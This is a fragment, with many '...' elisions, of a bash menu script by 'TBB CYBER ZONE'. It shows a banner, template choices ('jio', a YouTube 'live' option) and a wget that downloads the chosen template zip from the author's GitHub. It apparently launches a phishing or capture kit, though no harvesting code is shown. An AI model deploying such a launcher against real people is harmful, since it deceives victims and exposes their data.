...
# Author     : Tushar
# Github     : https://github.com/TBBCYBERZONE
...
${green}                                               [By TUSHAR (TBB CYBER ZONE)]
"
...
sleep 1
printf "${cyan}\nTUSHAR${nc}@${blue}TBBCYBERZONE ${red}$ ${nc}"
read option
# Select template
    if echo $option | grep -q "1"; then
        dir="jio"
        ...
        dir="live"
        printf "\n${ask}Enter youtube video ID:${cyan}\n\n29HRH8Z-1EQ${nc}@${blue}29HRH8Z-1EQ ${red}$ ${nc}"
        read vid_id
        if [ -z $vid_id ]; then
            echo -e "\n${error}Invalid input!\n\007"
            sleep 1
...
$red[Author]     ${cyan} :[TUSHA]
$red[Github]     ${cyan} :[https://github.com/tbbcyberzone] 
$red[Join us]    ${cyan} :[https://bit.ly/3PV3S3r]
$red[Telegarm]   ${cyan} :[https://t.me/tushar976]"
printf "${cyan}\nTUSHAR${nc}@${cyan}TBB CYBER ZONE ${red}$ ${nc}"
read about
...
cd $dir
netcheck
wget -q --show-progress "https://github.com/TBBCYBERZONE/files/raw/main/${dir}.zip"
